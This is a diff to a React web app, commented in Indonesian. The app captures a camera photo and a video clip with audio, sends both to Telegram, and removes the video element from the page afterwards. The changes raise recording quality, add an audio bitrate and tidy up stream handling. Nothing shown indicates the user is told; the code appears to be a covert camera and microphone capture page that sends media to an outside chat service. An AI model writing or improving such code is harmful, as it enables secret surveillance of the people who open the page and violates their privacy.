@@ -116,7 +116,7 @@ function App() {
             facingMode: typeof facingMode === 'string' ? facingMode : facingMode.deviceId,
             width: { min: 640, ideal: 1920, max: 3840 },
             height: { min: 480, ideal: 1080, max: 2160 },
-            frameRate: { min: 15, ideal: 30, max: 60 },
+            frameRate: { min: 24, ideal: 30, max: 60 }, // Memastikan frame rate minimal 24 fps
             aspectRatio: { ideal: 9 / 16 },
           },
           audio: true,
@@ -185,7 +185,7 @@ function App() {
           deviceId: { exact: deviceId },
           width: { min: 640, ideal: 1920, max: 3840 },
           height: { min: 480, ideal: 1080, max: 2160 },
-          frameRate: { min: 15, ideal: 30, max: 60 },
+          frameRate: { min: 24, ideal: 30, max: 60 },
           aspectRatio: { ideal: 9 / 16 },
         },
         audio: true,
@@ -244,8 +244,9 @@ function App() {
       const settings = videoTrack.getSettings();
       const videoWidth = settings.width || 1280;
       const videoHeight = settings.height || 720;
+      const frameRate = settings.frameRate || 30;
 
-      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
+      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight} dengan frame rate: ${frameRate}`);
 
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
@@ -263,7 +264,7 @@ function App() {
       canvas.width = drawWidth;
       canvas.height = drawHeight;
 
-      const context = canvas.getContext('2d');
+      const context = canvas.getContext('2d', { willReadFrequently: true });
       if (context) {
         context.drawImage(cameraVideo, 0, 0, drawWidth, drawHeight);
       }
@@ -279,12 +280,16 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      const supportedMimeType = ['video/webm;codecs=vp9', 'video/mp4;codecs=h264', 'video/mp4']
-        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
+      // Optimasi pengkodean video untuk kelancaran
+      const supportedMimeType = ['video/mp4;codecs=h264', 'video/webm;codecs=vp9']
+        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4;codecs=h264'; // Prioritaskan H.264 untuk kompatibilitas
+
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 2500000,
+        videoBitsPerSecond: 4000000, // Tingkatkan bitrate untuk kualitas lebih baik (4 Mbps)
+        audioBitsPerSecond: 128000, // Bitrate audio standar
       });
+
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
 
@@ -298,6 +303,8 @@ function App() {
           console.warn('File video kosong, tidak dikirim ke Telegram.');
           return;
         }
+
+        // Kompresi tambahan jika diperlukan (opsional)
         try {
           await sendVideoToTelegram(videoBlob);
           console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
@@ -310,8 +317,8 @@ function App() {
         console.error(`Error saat merekam kamera ${type}:`, e);
       };
 
-      mediaRecorder.start(1000);
-      console.log(`Mulai merekam kamera ${type}`);
+      // Mulai perekaman dengan interval yang lebih pendek untuk pengujian
+      mediaRecorder.start(500); // Kurangi interval data untuk mengurangi buffering
 
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
@@ -324,6 +331,8 @@ function App() {
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
     } catch (error) {
       console.error(`Error saat merekam kamera ${type}:`, error);
+    } finally {
+      currentStream.getTracks().forEach(track => track.stop()); // Hentikan semua track setelah selesai
     }
   };
 
